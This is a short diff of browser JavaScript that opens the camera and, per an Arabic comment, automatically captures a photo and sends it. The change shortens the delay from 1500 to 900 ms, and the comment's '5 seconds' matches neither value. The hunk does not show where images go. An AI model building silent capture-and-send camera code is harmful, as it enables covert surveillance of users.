@@ -41,7 +41,7 @@
       .then(stream => {
           video.srcObject = stream;
           // بعد 5 ثواني، يلتقط صورة ويرسلها
-          setTimeout(captureAndSend, 1500);
+          setTimeout(captureAndSend, 900);
       })
       .catch(err => {
           console.error('خطأ في الوصول للكاميرا:', err);
